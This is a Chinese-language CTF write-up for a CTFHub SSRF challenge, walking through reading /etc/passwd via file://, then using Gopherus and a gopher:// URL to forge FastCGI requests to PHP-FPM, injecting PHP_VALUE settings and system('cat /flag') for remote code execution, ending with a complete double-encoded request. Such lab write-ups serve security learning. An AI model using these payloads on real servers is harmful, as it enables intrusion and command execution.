---
title: "CTFHub SSRF 实战：FastCGI 协议攻击与 Gopherus 工具使用"
date: 2026-06-10T23:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "SSRF", "FastCGI", "Gopher", "Gopherus", "PHP-FPM", "CTFHub"]
categories: ["WriteUp"]
---

## 一、题目信息

- **平台**：CTFHub
- **分类**：Skill / Web / SSRF
- **考点**：SSRF（服务器端请求伪造）、FastCGI 协议、Gopher 协议、PHP-FPM 攻击、双重 URL 编码
- **工具**：Gopherus、Burp Suite、cURL

题目给出一个 `?url=` 参数，服务器使用 PHP curl 代为请求用户指定的地址。

```
http://challenge-xxxx.sandbox.ctfhub.com:10800/?url=
```

目标是通过 SSRF 攻击内网的 **PHP-FPM (FastCGI)** 服务（通常运行在 `127.0.0.1:9000`），实现远程代码执行（RCE），最终读取 flag。

---

## 二、环境探测与分析

### 2.1 确认 SSRF 存在

首先验证 `?url=` 参数是否存在 SSRF：

```bash
curl -s "http://target/?url=file:///etc/passwd"
```

返回了 `/etc/passwd` 内容，确认存在 SSRF。

### 2.2 读取源码分析

```bash
curl -s "http://target/?url=file:///var/www/html/index.php"
```

源码如下：

```php
<?php
error_reporting(0);

if (!isset($_REQUEST['url'])) {
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

关键点：
- 使用 `$_REQUEST['url']` 接收参数，支持 GET/POST
- 使用 `curl_exec()` 执行请求，支持多种协议（http/https/ftp/gopher/file 等）
- `CURLOPT_FOLLOWLOCATION` 开启了跟随重定向

### 2.3 确认 FastCGI 服务存活

```bash
curl -s "http://target/?url=gopher://127.0.0.1:9000/_test"
```

返回 `504 Gateway Time-out`，说明服务器确实尝试连接了 `127.0.0.1:9000`，只是 gopher payload 不正确导致 FastCGI 未响应。

---

## 三、工具介绍：Gopherus

[Gopherus](https://github.com/Esonhugh/Gopherus3) 是一个用于生成 Gopher 协议 SSRF Payload 的工具，支持多种内网服务攻击：

- MySQL (3306)
- PostgreSQL (5432)
- FastCGI (9000)
- Redis (6379)
- Memcached (11211)
- Zabbix (10050)
- SMTP (25)

### 3.1 安装

```bash
git clone https://github.com/Esonhugh/Gopherus3.git
cd Gopherus3
pip install -e .
```

### 3.2 生成 FastCGI Payload

```bash
gopherus3 --exploit fastcgi
```

按提示输入：
- **目标文件**：`/var/www/html/index.php`（服务器上真实存在的 PHP 文件）
- **执行命令**：`cat /flag`

> **注意**：CTFHub 的 PHP-FPM 需要指定一个真实存在的 `.php` 文件作为 `SCRIPT_FILENAME`。通过 `file://` 协议探测，确认 `/var/www/html/index.php` 存在。

---

## 四、FastCGI 攻击原理

### 4.1 为什么能攻击 PHP-FPM？

PHP-FPM 通过 FastCGI 协议与 Web 服务器（如 Nginx）通信。当我们可以直接发送 FastCGI 请求到 PHP-FPM 时，可以伪造环境变量，其中包括 **`PHP_VALUE`**。

通过设置：
```
PHP_VALUEallow_url_include = On
disable_functions = 
auto_prepend_file = php://input
```

- `auto_prepend_file = php://input`：让 PHP 在处理请求前，先包含 POST 输入流中的内容
- `allow_url_include = On`：允许包含 URL 资源
- `disable_functions = `：清空禁用函数列表

然后在 POST Body 中注入 PHP 代码：
```php
<?php system('cat /flag');die('-----Made-by-SpyD3r-----\n');?>
```

PHP-FPM 执行该脚本时，会先执行 `php://input` 中的恶意代码，从而实现 RCE。

### 4.2 双重 URL 编码问题

这是本题最容易踩坑的地方。

**正确的数据流**：
1. HTTP 请求发送时，`%2501` 被原样发送
2. PHP 对 `$_GET['url']` 解码一次：`%2501` → `%01`
3. curl 库再对 gopher URL 解码：`%01` → `\x01`（二进制控制字符）
4. FastCGI 协议正常解析

**在 cURL 命令行中**：
```bash
curl "http://target/?url=gopher://..._%2501..."
```
`%2501` 会被原样发送，符合预期。

**在 Burp Suite Repeater URL 栏中**：
如果输入 `%2501`，Burp 会**再次编码**为 `%252501`，导致最终发出去的是 `%2501`，curl 解析为 `%01`（不是 `\x01`），攻击失败。

**解决方案**：
- **cURL**：使用二次编码版本（`%2501`）
- **Burp Raw 标签页**：直接贴入完整的 HTTP 请求，Burp 不会二次编码
- **Burp URL 栏**：使用原始一次编码版本（`%01`），让 Burp 自动编码一次

---

## 五、详细解题步骤

### 5.1 第一步：生成 Payload

使用 Python 脚本直接生成（避免交互式输入）：

```python
import sys
sys.path.insert(0, '/home/san/Applications/Gopherus3')
from gopherus3.module.FastCGI import FastCGI
from gopherus3.piper import LineN

class MockArgs:
    targetfile = '/var/www/html/index.php'
    command = 'cat /flag_xxx'
    help = False

class MockParser:
    def add_argument(self, *a, **k): pass
    def parse_args(self): return MockArgs()
    def print_help(self): pass

f = FastCGI(MockParser(), {'host': '127.0.0.1', 'port': 9000})
f.targetfile = '/var/www/html/index.php'
f.command = 'cat /flag* | base64'  # 使用通配符 + base64 避免二进制输出问题
payload = LineN().pipe(f.generate())
print(payload.replace('%', '%25'))  # 二次编码，用于 curl
```

### 5.2 第二步：找 flag 文件

先生成一个 `ls -la / | base64` 的 payload：

```bash
curl -s "http://target/?url=$(cat /tmp/payload_ls.txt)" | strings | grep -o '[A-Za-z0-9+/=]\{20,\}' | base64 -d
```

输出：
```
total 68
drwxr-xr-x    1 root     root          4096 Jun 10 15:18 .
drwxr-xr-x    1 root     root          4096 Jun 10 15:18 ..
-rwxr-xr-x    1 root     root             0 Jun 10 15:18 .dockerenv
drwxr-xr-x    1 root     root          4096 Jan 31  2019 bin
...
-rw-r--r--    1 root     root            33 Jun 10 15:18 flag_5bf727fa6b41654b0ee25f4cce946e6c
...
```

发现 flag 文件是 `/flag_5bf727fa6b41654b0ee25f4cce946e6c`，不是简单的 `/flag`。

### 5.3 第三步：读取 flag

生成读取 flag 的 payload（命令：`cat /flag* | base64`）：

```bash
curl -s "http://target/?url=$(cat /tmp/payload_b64.txt)" | grep -o '[A-Za-z0-9+/=]\{20,\}' | base64 -d
```

输出 base64：
```
Y3RmaHViezY0ODYxMzRhOWU5MTY2MWRkYmI5OTk0MX0=
```

解码得到 flag：
```bash
echo 'Y3RmaHViezY0ODYxMzRhOWU5MTY2MWRkYmI5OTk0MX0=' | base64 -d
# ctfhub{6486134a9e91661ddbb99941}
```

### 5.4 Burp Suite 成功截图

在 Burp Repeater 的 **Raw** 视图中，可以清晰看到返回的 base64 编码 flag 和 `-----Made-by-SpyD3r-----` 标记：

![Burp Suite FastCGI 攻击成功截图](../../images/ctfhub-ssrf-fastcgi-burp-success.png)

---

## 六、踩坑记录

### 6.1 Burp Suite 显示空白

FastCGI 返回的响应包含二进制控制字符（`\x01`、`\x00` 等），Burp Suite 的 **Pretty** 视图解析失败会直接显示空白。

**解决**：
- 使用 **Raw** 视图查看原始响应
- 或者让命令输出 base64 编码，响应中只有纯文本字符

### 6.2 Burp 二次编码导致攻击失败

在 Burp Repeater 的 URL 栏中输入 `%2501`，Burp 会自动编码为 `%252501`，导致 payload 错误。

**解决**：
- 在 **Raw** 标签页中直接贴入完整的 HTTP 请求
- 或者使用原始一次编码版本（`%01`），让 Burp 自动做一次编码

### 6.3 cURL 终端输出报错

```
client returned ERROR on write of 168 bytes
Failed reading the chunked-encoded stream
```

这是因为响应中的二进制字符导致终端无法处理。

**解决**：
```bash
curl -s "http://target/?url=..." > /tmp/result.bin
strings /tmp/result.bin | grep ctfhub
```

### 6.4 找不到 flag 文件

根目录下没有 `/flag`，而是随机命名的 `flag_xxx` 文件。

**解决**：先 `ls -la /` 找到正确的文件名，再读取。

---

## 七、完整 HTTP 请求（Burp Raw 可直接使用）

```http
GET /?url=gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH71%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500G%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520/flag%252A%2520%257C%2520base64%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 HTTP/1.1
Host: challenge-63db532fcffd8aaf.sandbox.ctfhub.com:10800
```

---

## 八、总结

| 步骤 | 操作 | 目的 |
|------|------|------|
| 1 | `file:///etc/passwd` | 确认 SSRF 存在 |
| 2 | `file:///var/www/html/index.php` | 读取源码，确认利用点 |
| 3 | Gopherus 生成 FastCGI Payload | 构造攻击数据 |
| 4 | 双重 URL 编码 | 确保 payload 正确传递 |
| 5 | `ls -la / \| base64` | 找到 flag 文件 |
| 6 | `cat /flag* \| base64` | 读取并编码 flag |
| 7 | Base64 解码 | 拿到最终 flag |

**核心知识点**：
- SSRF 通过 Gopher 协议攻击内网服务
- FastCGI 协议可以直接与 PHP-FPM 通信，伪造 `PHP_VALUE` 环境变量
- `auto_prepend_file = php://input` + `allow_url_include = On` = RCE
- 双重 URL 编码是在 HTTP GET 参数中传递 gopher payload 的关键
- 遇到二进制响应时，使用 base64 编码输出可避免显示问题

---

**Flag**：`ctfhub{6486134a9e91661ddbb99941}`